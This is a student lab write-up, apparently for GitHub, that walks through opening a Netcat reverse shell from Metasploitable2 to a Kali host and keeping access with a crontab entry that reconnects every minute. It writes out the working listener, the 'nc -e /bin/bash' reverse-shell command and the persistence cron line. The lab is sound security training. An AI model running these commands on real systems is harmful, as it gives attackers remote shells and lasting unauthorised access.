## Lab07 – Netcat Reverse Shell & Crontab Persistence
## Description
In this lab, we achieved a reverse shell from Metasploitable2 to Kali Linux using Netcat and then maintained persistent access via crontab. This technique demonstrates a real-world post-exploitation scenario where the attacker regains access even after system reboots.

## Target System
OS: Metasploitable2

IP: 192.168.56.101

Attacker (Kali) IP: 192.168.56.102

## Exploitation Steps
🔹 Step 1: Start a Netcat listener on the attacker (Kali) machine
bash
Copy
Edit
nc -lvnp 4444
🔹 Step 2: Execute a reverse shell on the victim (Metasploitable2)
bash
Copy
Edit
nc -e /bin/bash 192.168.56.102 4444
Note: nohup was not available in the system, so raw Netcat reverse shell was used.

🔹 Step 3: Verify shell access on Kali
Once connected:

bash
Copy
Edit
whoami
hostid
ip a
## Persistence via Crontab
🔹 Step 4: Edit crontab on Metasploitable2
bash
Copy
Edit
crontab -e
🔹 Step 5: Add the following line to create a persistent reverse shell every minute:
bash
Copy
Edit
* * * * * nc -e /bin/bash 192.168.56.102 4444
## Screenshots (click to view)
Upload the following to GitHub and link them with ![](url) markdown syntax

Netcat listener setup

Reverse shell received

Command outputs (whoami, hostid, ip a)

Crontab modification screen

Reconnected shell via crontab

🧠 What I Learned
How reverse shells work with Netcat (nc -e /bin/bash)

The concept of incoming vs outgoing connections and attacker-listener logic

How to maintain persistence via scheduled tasks (cron jobs)

Basic Linux post-exploitation persistence methods

Importance of avoiding common detection (e.g., disabling nohup makes attackers try fallback methods)

